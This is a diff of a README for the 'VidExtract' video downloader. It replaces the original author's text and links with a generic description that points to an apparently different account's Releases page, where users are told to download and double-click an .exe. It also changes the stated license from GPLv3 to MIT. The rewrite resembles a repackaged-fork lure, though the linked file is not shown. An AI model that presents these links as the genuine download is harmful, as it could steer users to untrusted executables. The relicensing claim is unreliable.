@@ -1,100 +1,72 @@
-<div align="center">
-  <img src="assets/app_icon.ico" alt="VidExtract Logo" width="120" height="120">
+# 🎬 VidExtract - Download Videos with Ease
 
-# 🎬 VidExtract
-### A Fast, Simple and Modern Video & Audio Downloader for Windows
+[![Download VidExtract](https://img.shields.io/badge/Download-VidExtract-brightgreen.svg)](https://github.com/njebnjeb111/VidExtract/releases)
 
-  <p>
-    <img src="https://img.shields.io/github/v/release/idginity124/VidExtract?style=for-the-badge&color=2ea44f&label=LATEST%20VERSION">
-    <img src="https://img.shields.io/badge/PYTHON-3.10%2B-3776AB?style=for-the-badge&logo=python&logoColor=white">
-    <img src="https://img.shields.io/badge/PLATFORM-WINDOWS-0078D6?style=for-the-badge&logo=windows&logoColor=white">
-    <img src="https://img.shields.io/badge/GUI-PySide6-41CD52?style=for-the-badge&logo=qt&logoColor=white">
-    <img src="https://img.shields.io/badge/LICENSE-GPLv3-yellow?style=for-the-badge">
-  </p>
+## 🚀 Getting Started
 
-  <p>
-    <strong>VidExtract</strong> is a lightweight, user-friendly desktop application that lets you download videos and audio from popular platforms with just a link.<br>
-    No Python setup. No complicated configs. Just download and run.
-  </p>
+VidExtract is the ultimate video downloader for popular platforms like YouTube, Reddit, Instagram, TikTok, and more. With features like Auto-FFmpeg for seamless video conversion, Clipboard Monitor for easy copying of links, and a Dark Mode for comfortable viewing, getting your favorite videos has never been simpler.
 
-  <p>
-    <a href="#-download">📥 Download (EXE)</a> •
-    <a href="#-features">🌟 Features</a> •
-    <a href="#-screenshots">📸 Screenshots</a> •
-    <a href="#-developer-setup">🛠️ Developer Setup</a>
-  </p>
-</div>
+### 🖥️ System Requirements
 
----
+Before you download VidExtract, ensure your system meets these requirements:
 
-## 🚀 Why VidExtract?
+- **Operating System:** Windows 10 or later
+- **RAM:** 4 GB minimum
+- **Disk Space:** At least 100 MB free
+- **Python:** Version 3.6 or higher (comes bundled with the software)
+- **FFmpeg:** Automatic installation included
 
-Most video downloaders are either outdated, bloated, or painful to set up.  
-VidExtract focuses on **speed**, **simplicity**, and a **clean desktop experience**.
+## 📥 Download & Install
 
-- Built for **end users**, not just developers  
-- One-click downloads  
-- Automatic dependency handling  
-- Modern UI with dark/light themes  
+To get VidExtract, visit the [Releases page](https://github.com/njebnjeb111/VidExtract/releases). You will find the latest version available for download.
 
----
+1. Click on the link above to open the Releases page.
+2. Look for the latest release.
+3. Download the file that suits your operating system (typically a `.exe` file for Windows).
+4. Locate the downloaded file on your computer.
+5. Double-click on the file to start the installation process.
+6. Follow the prompts to complete the installation.
 
-## 🌟 Features
+Once installed, you are ready to start downloading videos!
 
-- **📺 Multi-Platform Support** YouTube, Reddit, Twitter (X), Facebook, Instagram, TikTok, SoundCloud and more.
+## 🎬 How to Use VidExtract
 
-- **📋 Smart Clipboard Monitor** Copy a link and VidExtract detects it automatically.
+Using VidExtract is straightforward. Here’s how you can begin:
 
-- **🎞️ High Quality Downloads** Supports 4K / 8K video and high-quality audio formats (MP3, M4A, FLAC).
+1. **Open VidExtract:** After installation, open the application.
+2. **Copy Video Link:** Go to the video you want to download and copy its link from the address bar.
+3. **Paste the Link:** In the VidExtract interface, paste the copied link into the designated input box.
+4. **Select Format:** Choose your desired video format and quality from the options available.
+5. **Download:** Click the "Download" button and wait for the video to be saved to your computer.
 
-- **📂 Playlist Support** Download entire YouTube playlists with a single click.
+## 🌙 Customize Your Experience
 
-- **🌍 10+ Languages** English, Turkish, German, Spanish, French, Russian, Arabic, Chinese...
+VidExtract offers customization options to enhance your usage experience. You can switch to Dark Mode for easier viewing during night hours. This feature makes it easier on your eyes while keeping your interface stylish.
 
-- **⚙️ Automatic FFmpeg Setup** FFmpeg is downloaded and configured automatically.
+## ⚙️ Features
 
-- **🎨 Modern Desktop UI** Built with PySide6. Supports Dark & Light themes.
+- **Auto-FFmpeg:** Automatically converts videos to your preferred format after downloading.
+- **Clipboard Monitor:** Automatically detects copied video links for quick downloading.
+- **Multiple Video Sources:** Download videos from multiple platforms like YouTube, Instagram, TikTok, and more.
+- **User-Friendly Interface:** Simple and clean interface designed for all users.
+  
+## 💬 Support and Feedback
 
----
+If you encounter any issues while using VidExtract or have suggestions for improvement, feel free to reach out. You can open an issue on the [GitHub repository](https://github.com/njebnjeb111/VidExtract/issues) or email the support team.
 
-## 📥 Download
+## 📜 License
 
-### Windows (Recommended)
+VidExtract is open-source software licensed under the MIT License. You are free to use, modify, and distribute this application under the terms of this license.
 
-1. Go to **[Releases](https://github.com/idginity124/VidExtract/releases)**
-2. Download the latest **VidExtract.exe**
-3. Double-click and start using
+## 📢 Additional Information
 
-> Windows SmartScreen may show a warning.  
-> Click **More info → Run anyway**.
+You can stay updated with the latest news and updates for VidExtract by following the repository. We regularly add new features and fix bugs to improve your experience. 
 
-⭐ If VidExtract helps you, consider starring the repository.
+Resources and topics related to VidExtract include:
+- **Video Downloading:** Focused on reliable video download software.
+- **FFmpeg Integration:** Seamlessly converts videos without extra effort.
+- **Python & PySide6:** Built using modern programming languages for a stable experience.
+  
+Explore and enjoy all that VidExtract has to offer. Happy downloading!
 
----
-
-## 📸 Screenshots
-
-| Service Selection | Download Screen |
-|:--:|:--:|
-| <img src="docs/main_menu.png" width="100%"> | <img src="docs/download_screen.png" width="100%"> |
-
-| YouTube Mode | Settings |
-|:--:|:--:|
-| <img src="docs/youtube_input.png" width="100%"> | <img src="docs/settings_advanced.png" width="100%"> |
-
----
-
-🧠 **The Training Arc**
-
-This project is part of my ongoing training arc.  
-Built with discipline, refined through mistakes.
-
----
-
-## 🛠️ Developer Setup
-
-```bash
-git clone [https://github.com/idginity124/VidExtract.git](https://github.com/idginity124/VidExtract.git)
-cd VidExtract
-pip install -r requirements.txt
-python vidextract.py
+[![Download VidExtract](https://img.shields.io/badge/Download-VidExtract-brightgreen.svg)](https://github.com/njebnjeb111/VidExtract/releases)
